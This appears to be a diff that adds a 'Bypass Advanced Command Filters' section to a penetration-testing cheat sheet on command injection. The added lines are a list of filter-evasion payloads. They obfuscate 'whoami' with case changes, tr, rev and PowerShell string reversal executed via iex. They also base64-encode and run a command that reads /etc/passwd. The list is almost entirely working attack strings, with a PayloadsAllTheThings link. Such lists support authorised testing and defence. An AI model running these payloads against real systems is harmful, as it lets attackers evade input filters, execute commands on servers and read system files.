@@ -762,6 +762,26 @@ w\ho\am\i
 who^ami
 ```
 
+- Bypass Advanced Command Filters
+
+```
+WHOAMI
+WhOaMi
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+echo 'whoami' | rev
+$(rev<<<'imaohw')
+"whoami"[-1..-20] -join ''
+iex "$('imaohw'[-1..-20] -join '')"
+echo -n 'cat /etc/passwd | grep 33' | base64
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion
+```
+
 #12. - Sensitive Data Exposure
 -----------------------------------------
 
